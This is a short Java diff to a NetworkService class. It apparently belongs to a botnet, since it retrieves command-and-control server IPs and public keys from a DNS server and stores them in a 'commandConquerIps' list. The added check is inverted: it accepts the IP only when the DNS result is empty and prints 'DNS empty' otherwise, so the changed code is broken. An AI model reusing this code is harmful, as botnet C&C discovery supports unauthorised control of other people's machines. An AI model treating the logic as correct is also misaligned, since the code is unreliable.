@@ -278,12 +278,15 @@ public class NetworkService {
 			Pairs<IP, PublicKey> cec = new Pairs<>();
 			try {
 			result = botReq.getIpCeCFromDnsServer(url);
-			cec.setValue1(new IP(result.getValue1()));
+			String buff=result.getValue1();
+				if(buff.equals("")){
+			cec.setValue1(new IP(buff));
 			cec.setValue2(pki.rebuildPuK(result.getValue2()));
 			commandConquerIps.add(cec);
 			commandConquerIps.getList().forEach(ip -> System.out.println(ip.getValue1()));
 			System.out.println("Connessione con DNS server OK");
 			return Boolean.TRUE;
+			}else System.out.println("DNS empty");
 			} catch (Exception ex) {
 			System.err.println("Errore durante la richiesta di IP\n" + ex);
 			}
